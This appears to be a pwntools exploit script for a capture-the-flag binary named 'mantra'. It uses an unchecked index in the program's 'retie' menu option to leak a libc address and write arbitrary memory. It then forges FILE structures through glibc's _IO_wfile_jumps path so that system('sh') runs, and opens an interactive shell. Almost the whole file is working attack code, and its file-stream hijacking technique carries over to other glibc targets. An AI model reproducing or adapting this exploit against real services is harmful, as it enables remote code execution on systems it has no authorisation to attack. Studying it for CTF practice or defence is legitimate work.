#!/usr/bin/env python3
from ctypes import CDLL
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
import traceback
# =========================================================
#                          SETUP                         
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'mantra')
context.bits = 64
context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
except: libc = type('S',(),{'address':0})()
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
b *retie_bead+207
b *_IO_flush_all_lockp

c
'''.format(**locals())

is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    update_checksec() 
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        host, port = ("localhost", 5000) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=False)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe=exe)
        else:
            attach(io, gdbscript=gdbscript)

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1: 
            end = len(src)
        if src[start:end].strip() == "":
            output = execute(["checksec", "--file", exe])
            commented = "".join(("# " + line + "\n") if line.strip() else "#\n" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
se      = lambda data               :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda num, data=None     : u32((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(4, b"\x00"))
uu64    = lambda num, data=None     : u64((io.recv(num) if not data else io.recvuntil(data)[-num:]).ljust(8, b"\x00"))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
# [*] '/mnt/c/Users/dionf/Documents/pwn_mantra/mantra'
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     RUNPATH:    b'./glibc'
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No

# =========================================================
#                         EXPLOITS
# =========================================================
def menu(choice: int):
    """
    Send a menu choice to the program.
    The binary prints:
      [1] Weave Cord
      [2] Tie Beads
      [3] Retie Bead
      [4] Recite Bead
      > 
    """
    sla(b"> ", se(choice))

def weave(num_beads: int):
    """
    [1] Weave Cord
    Prompts with: "Number of beads to string: "
    """
    menu(1)
    sla(b"Number of beads to string: ", se(num_beads))


def tie(payload):
    """
    Tie `num_beads` beads using one big bytes payload.
    It will be split into 8-byte chunks and padded with 'A' if needed.
    """
    menu(2)
    sla(b"How many beads will you tie? ", se(len(payload)//8))

    blob = bytes(payload)
    blob = blob.ljust(8 * (len(payload)//8), b"\x00")[:8 * (len(payload)//8)]

    for i in range(len(payload)//8):
        chunk = blob[i*8:(i+1)*8]
        sla(f"Bead {i} (exactly 8 glyphs): ".encode(), chunk)

def retie(index: int, payload: bytes):
    """
    [3] Retie Bead
    Prompts:
      "\nWhich bead will you retie? "
      "\nNew mantra for bead %lu (8 glyphs): "
    Does an *unbounded* write to buf + 8*index.
    """
    menu(3)
    # First the bead index
    sla(b"Which bead will you retie? ", se(index))

    # Make sure payload is exactly 8 bytes (scanf " %8c")
    if len(payload) != 8:
        payload = payload.ljust(8, b"A")[:8]

    # Match on the tail of the prompt so we don't care about the %lu
    sa(b"8 glyphs): ", payload)

def recite(index: int) -> bytes:
    """
    [4] Recite Bead
    Prompts:
      "Which bead will you recite? "
      then prints: "Bead %lu speaks: [<8 bytes>]"
    We read the 8 bytes between '[' and ']'.
    """
    menu(4)
    sla(b"Which bead will you recite? ", se(index))

    # Eat everything up to the opening bracket
    ru(b"[")

def write(where, what):
    retie(0xf7fe + ((where - libc.address)//8), p64(what))

def stdout_leak(target=None, size=0x8):
    return p64(0xfbad1800) + p64(0)*3 + (p64(target) + p64(target + size) if target is not None else b'\x00')

def fsop(fp=None, offset=0x18):
    fp = fp if fp is not None else libc.sym["_IO_2_1_stdout_"]
    fs = IO_FILE_plus_struct()
    fs.flags = b"sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp
    fs._lock = fp+0x100
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x18 # _IO_wfile_overflow -> _IO_wdoallocbuf+43
    return bytes(fs)


def fsop_via__libio_codecvt_out(fp=None, offset=0x18):
    fp = libc.sym["_IO_2_1_stdout_"] if fp is None else fp
    gadget = libc.address + 0x001563c3 # add rdi, 0x10; jmp rcx;

    fs = IO_FILE_plus_struct()
    fs.flags = 1
    fs._IO_read_ptr = libc.sym["system"] + 4
    fs._IO_read_end = libc.sym["system"] + 3
    fs._IO_write_base = 0
    fs._IO_write_ptr  = fs._IO_write_base + 8
    fs._IO_write_end = b"/bin/sh\x00"
    fs._IO_save_base   = gadget
    fs._IO_backup_base = 0
    fs._IO_save_end    = fp + 0x20
    fs._lock = fp + 0x100
    fs._codecvt   = fp + 0x58 - 0x38
    fs._wide_data = fp + 0x08 - 0x18
    fs._mode = 1
    fs.unknown2 = p64(0)*3 + p64(0)

    fs.vtable = libc.sym["_IO_wfile_jumps"] + offset - 0x18
    return bytes(fs)

def exploit(x):
    global io
    io = initialize()
    # Code here ...
    weave(0xf000)
    recite(0xf2d4)
    libc_leak = u64(ru(b"]").ljust(8, b"\x00"))
    libc.address = libc_leak - libc.sym["_nl_global_locale"]
    leak("Leaked libc address", hex(libc_leak))
    target = libc.address - 0x7bff0
    payload = fsop(target)
    tie(payload)
    # dtor_list_func = 0xf2dc
    # cookie = 0xf2ec
    # retie(cookie, p64(0))
    # retie(dtor_list_func, p64(target))
    # payload = p64(libc.sym['system']<<17) + p64(ns(libc, "/bin/sh"))
    # tie(payload)
    # write(libc.sym["initial"] + 32, ns(libc, "/bin/sh"))  # _IO_list_all

    write(libc.sym["_IO_list_all"], target)  # _IO_list_all

    debug()
    # retie(0, p64(0xdead))
    # write(libc.sym["_IO_2_1_stdout_"], 0xfbad1800)  # one_gadget
    # write(libc.sym["_IO_2_1_stdout_"] + 8, 0)  # one_gadget
    # write(libc.sym["_IO_2_1_stdout_"] + 16, 0)  # one_gadget
    # write(libc.sym["_IO_2_1_stdout_"] + 24, 0)  # one_gadget

    # write(libc.sym["_IO_2_1_stdout_"] + 32, libc.sym["environ"])  # one_gadget

    # tie(10, [b"A"*8 for _ in range(10)])
    # retie(10, b"A"*8)

    # offset = 0x100
    # payload = flat({offset:[]}, filler=b"\x00")
    leak("ELF base address", hex(elf.address)) if elf.address else None
    leak("Libc base address", hex(libc.address)) if libc.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except Exception as e:
            sys.stderr.write(traceback.format_exc())
        io.close()